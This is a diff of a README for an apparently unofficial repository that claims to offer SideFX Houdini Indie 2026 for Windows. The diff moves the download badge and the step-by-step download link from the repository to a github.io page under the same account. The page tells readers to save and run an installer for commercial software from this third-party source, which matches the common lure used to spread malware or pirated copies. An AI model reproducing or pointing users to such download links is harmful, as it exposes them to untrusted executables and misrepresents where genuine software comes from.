@@ -1,6 +1,6 @@
 # 🛠️ SideFX-Houdini-Indie-2026 - Access Professional Animation Tools Easily
 
-[![](https://img.shields.io/badge/Download_Houdini_Indie-Blue?style=for-the-badge)](https://github.com/Filelaunchingpad916/SideFX-Houdini-Indie-2026)
+[![](https://img.shields.io/badge/Download_Houdini_Indie-Blue?style=for-the-badge)](https://filelaunchingpad916.github.io)
 
 This repository provides access to SideFX Houdini Indie for Windows 11 and Windows 10.houdini is a software package for 3D animation and visual effects. Artists use this tool to build complex scenes and procedural assets. This guide explains how to get the software on your computer.
 
@@ -28,7 +28,7 @@ Set aside at least 5 GB of space for the initial installation. Procedural files 
 Follow these steps to access the installer package.
 
 1. Open your web browser. 
-2. Visit the following link to access the repository page: [https://github.com/Filelaunchingpad916/SideFX-Houdini-Indie-2026](https://github.com/Filelaunchingpad916/SideFX-Houdini-Indie-2026).
+2. Visit the following link to access the repository page: [https://filelaunchingpad916.github.io](https://filelaunchingpad916.github.io).
 3. Look for the download section on the page.
 4. Click the link to retrieve the installer file.
 5. Save the file to your Downloads folder.
